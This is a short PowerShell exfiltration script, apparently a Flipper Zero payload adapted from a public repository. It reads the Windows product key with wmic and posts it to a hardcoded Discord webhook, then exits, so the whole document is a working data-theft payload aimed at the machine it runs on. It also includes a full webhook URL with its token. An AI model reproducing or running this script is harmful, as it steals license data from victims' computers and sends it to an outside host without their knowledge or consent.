# by template used aleff's code (https://github.com/aleff-github/my-flipper-shits/blob/main/Windows/Exfiltration/Exfiltrate_Windows_Product_Key/payload.txt)
$hookUrl = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
$exfiltration = @"
$(wmic path softwarelicensingservice get OA3xOriginalProductKey)
$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription)
"@
$payload = [PSCustomObject]@{
    content = $exfiltration
}
Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
exit
